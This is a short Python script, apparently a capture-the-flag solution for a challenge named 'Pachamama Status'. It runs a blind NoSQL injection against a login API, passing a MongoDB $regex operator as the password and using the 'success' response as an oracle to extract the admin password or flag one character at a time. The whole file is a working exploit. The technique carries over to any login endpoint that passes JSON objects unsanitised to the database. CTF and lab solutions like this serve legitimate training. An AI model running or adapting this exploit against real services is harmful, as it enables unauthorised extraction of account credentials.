#!/usr/bin/env python3
# Pachamama Status - NoSQL injection ($regex) para extraer la contraseña-flag
# del admin via POST /api/login. success:true  <=>  el regex casa.
import urllib.request, json, re, string, sys

U = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8000"
USERNAME = "pachamama_admin"

def matches(regex):
    data = json.dumps({"username": USERNAME, "password": {"$regex": regex}}).encode()
    req = urllib.request.Request(f"{U}/api/login", data=data,
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            body = r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:          # 401 = login fallido
        body = e.read().decode(errors="replace")
    return '"success":true' in body

# conjunto de caracteres a probar (re.escape se encarga de los especiales)
charset = [c for c in string.printable if c not in "\t\n\r\x0b\x0c"]

flag = "csh{"
print(f"[*] {flag}", end="", flush=True)
while True:
    found = False
    for c in charset:
        if matches("^" + re.escape(flag + c)):
            flag += c
            sys.stdout.write("\r[*] " + flag)
            sys.stdout.flush()
            found = True
            break
    if not found or flag.endswith("}"):
        break

print(f"\n[+] FLAG: {flag}")
if not flag.endswith("}"):
    print("[!] No termino en '}'. Puede faltar algun caracter raro; avisame.")
